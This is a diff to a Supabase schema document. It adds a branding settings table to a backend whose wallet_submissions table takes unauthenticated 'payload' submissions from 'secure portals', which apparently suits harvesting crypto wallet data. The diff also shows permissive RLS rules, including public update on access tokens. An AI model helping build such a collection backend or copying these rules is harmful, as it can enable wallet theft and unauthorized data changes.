@@ -41,6 +41,16 @@ Captures encrypted payload interactions from the secure portals.
 | `timestamp` | timestamptz | `now()` | Time of submission |
 | `user_agent` | text | - | Browser/Device fingerprint of the sender |
 
+### `app_settings`
+Global configuration settings for the application.
+
+| Column | Type | Default | Description |
+| :--- | :--- | :--- | :--- |
+| `id` | uuid | `gen_random_uuid()` | Primary Key |
+| `key` | text | - | Unique setting identifier (e.g., 'logo_url') |
+| `value` | text | - | The setting value |
+| `updated_at` | timestamptz | `now()` | Last update timestamp |
+
 ---
 
 ## 2. SQL Setup Script
@@ -83,21 +93,30 @@ create table if not exists wallet_submissions (
   user_agent text
 );
 
--- 4. Enable Row Level Security (RLS)
+-- 4. Create app_settings table
+create table if not exists app_settings (
+  id uuid default gen_random_uuid() primary key,
+  key text unique not null,
+  value text,
+  updated_at timestamp with time zone default timezone('utc'::text, now()) not null
+);
+
+-- 5. Enable Row Level Security (RLS)
 alter table access_tokens enable row level security;
 alter table portal_sessions enable row level security;
 alter table wallet_submissions enable row level security;
+alter table app_settings enable row level security;
 
--- 5. Access Tokens Policies
+-- 6. Access Tokens Policies
 create policy "Allow public token lookup" on access_tokens for select using (true);
 create policy "Allow public usage increment" on access_tokens for update using (true);
 create policy "Admin full access to tokens" on access_tokens for all to authenticated using (true);
 
--- 6. Portal Sessions Policies
+-- 7. Portal Sessions Policies
 create policy "Allow public session lookup" on portal_sessions for select using (true);
 create policy "Allow public session creation" on portal_sessions for insert with check (true);
 
--- 7. Wallet Submissions Policies (CRITICAL: Fixes 403 Forbidden)
+-- 8. Wallet Submissions Policies
 create policy "Allow public payload submissions" 
 on wallet_submissions 
 for insert 
@@ -115,6 +134,13 @@ on wallet_submissions
 for delete 
 to authenticated 
 using (true);
+
+-- 9. App Settings Policies
+create policy "Allow public settings lookup" on app_settings for select using (true);
+create policy "Admin full access to settings" on app_settings for all to authenticated using (true);
+
+-- Insert default logo key
+insert into app_settings (key, value) values ('logo_url', '') on conflict (key) do nothing;
 ```
 
 ---
@@ -122,6 +148,6 @@ using (true);
 ## 3. Deployment Notes
 
 - Ensure you run the SQL script above in your Supabase Dashboard.
-- RLS must be enabled for the `wallet_submissions` table to protect the sensitive payload data from unauthorized reads.
-- The `insert` policy for `wallet_submissions` is set to `public` to allow the secure portals to transmit data without requiring the end-user to be logged in as an Admin.
-```
+- RLS must be enabled for all tables to protect sensitive data.
+- The `insert` policy for `wallet_submissions` is set to `public` to allow secure portals to transmit data without requiring end-user authentication.
+- The `app_settings` table allows the admin to dynamically update branding elements like the logo.
